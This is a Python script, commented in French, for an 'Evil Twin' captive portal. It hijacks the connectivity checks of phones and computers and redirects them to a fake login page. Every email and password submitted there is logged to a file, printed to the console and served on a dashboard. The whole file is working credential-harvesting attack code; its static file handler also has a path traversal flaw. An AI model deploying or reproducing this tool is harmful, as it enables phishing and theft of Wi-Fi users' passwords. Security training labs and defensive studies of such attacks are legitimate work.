#!/usr/bin/env python3
"""
PORTAIL CAPTIF — Evil Twin
Serveur HTTP Python port 80
Intercepte les credentials et les affiche sur le dashboard SOC
"""

import http.server
import json
import os
import urllib.parse
from datetime import datetime

PORT = 80
PORTAL_DIR = os.path.dirname(os.path.abspath(__file__))
CREDENTIALS_LOG = os.path.join(PORTAL_DIR, "credentials.log")

# URLs de détection portail captif
CAPTIVE_URLS_204 = [
    "/generate_204", "/gen_204",
    "/connecttest.txt", "/ncsi.txt",
    "/hotspot-detect.html", "/success.txt",
    "/check_network_status.txt",
]

CAPTIVE_URLS_REDIRECT = [
    "/redirect", "/login", "/wifilogin",
    "/portal", "/captive", "/internet",
]

# Hosts MIUI/Xiaomi (connect.rom.miui.com)
MIUI_HOSTS = ["miui", "xiaomi", "connect.rom", "connectivitycheck"]


def get_device_type(user_agent):
    ua = user_agent.lower()
    if "iphone" in ua or "ipad" in ua:
        return "📱 iOS"
    elif "android" in ua:
        if "xiaomi" in ua or "miui" in ua or "redmi" in ua:
            return "📱 Xiaomi/MIUI"
        return "📱 Android"
    elif "windows" in ua:
        return "💻 Windows"
    elif "macintosh" in ua or "mac os" in ua:
        return "💻 macOS"
    return "❓ Unknown"


class CaptivePortalHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        # Silencieux sauf credentials
        pass

    def do_GET(self):
        host = self.headers.get("Host", "")
        user_agent = self.headers.get("User-Agent", "")

        # Priorité 1 : Redirect MIUI/Xiaomi
        if any(m in host.lower() for m in MIUI_HOSTS):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"""
                <html><head>
                <meta http-equiv="refresh" content="0;url=http://192.168.50.1/index.html">
                </head><body>Redirecting...</body></html>
            """)
            return

        # Détection portail captif → 200 (iOS/Android ouvre le navigateur)
        if self.path in CAPTIVE_URLS_204:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"""
                <html><head>
                <meta http-equiv="refresh" content="0;url=http://192.168.50.1/index.html">
                </head><body></body></html>
            """)
            return

        # Dashboard data API
        if self.path == "/dashboard/data":
            creds = []
            if os.path.exists(CREDENTIALS_LOG):
                with open(CREDENTIALS_LOG, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                creds.append(json.loads(line))
                            except:
                                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(creds).encode())
            return

        # Redirect vers portail
        if self.path in CAPTIVE_URLS_REDIRECT or self.path == "/":
            self.send_response(302)
            self.send_header("Location", "http://192.168.50.1/index.html")
            self.end_headers()
            return

        # Servir les fichiers statiques
        file_path = self.path.lstrip("/") or "index.html"
        full_path = os.path.join(PORTAL_DIR, file_path)

        if os.path.exists(full_path) and os.path.isfile(full_path):
            self.send_response(200)
            if full_path.endswith(".html"):
                self.send_header("Content-Type", "text/html; charset=utf-8")
            elif full_path.endswith(".css"):
                self.send_header("Content-Type", "text/css")
            elif full_path.endswith(".js"):
                self.send_header("Content-Type", "application/javascript")
            self.end_headers()
            with open(full_path, "rb") as f:
                self.wfile.write(f.read())
        else:
            # Tout le reste → portail
            self.send_response(302)
            self.send_header("Location", "http://192.168.50.1/index.html")
            self.end_headers()

    def do_POST(self):
        # Clear credentials (dashboard)
        if self.path == "/dashboard/clear":
            open(CREDENTIALS_LOG, "w").close()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"cleared")
            return

        # Capture credentials
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")
        params = urllib.parse.parse_qs(post_data)

        email = params.get("email", [""])[0]
        password = params.get("password", [""])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "")
        device = get_device_type(user_agent)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if email or password:
            credential = {
                "ip": client_ip,
                "device": device,
                "email": email,
                "password": password,
                "timestamp": timestamp,
            }
            with open(CREDENTIALS_LOG, "a") as f:
                f.write(json.dumps(credential) + "\n")

            print(f"\n{'='*50}")
            print(f"🚨 CREDENTIAL INTERCEPTED")
            print(f"   IP       : {client_ip}")
            print(f"   Device   : {device}")
            print(f"   Email    : {email}")
            print(f"   Password : {password}")
            print(f"   Time     : {timestamp}")
            print(f"{'='*50}\n")

        # Redirect to success page
        self.send_response(302)
        self.send_header("Location", "http://192.168.50.1/success.html")
        self.end_headers()


if __name__ == "__main__":
    os.makedirs(PORTAL_DIR, exist_ok=True)
    if not os.path.exists(CREDENTIALS_LOG):
        open(CREDENTIALS_LOG, "w").close()

    print(f"[*] Portail captif démarré sur port {PORT}")
    print(f"[*] Logs : {CREDENTIALS_LOG}")
    print(f"[*] Dashboard : http://192.168.50.1/dashboard.html")

    with http.server.HTTPServer(("0.0.0.0", PORT), CaptivePortalHandler) as httpd:
        httpd.serve_forever()
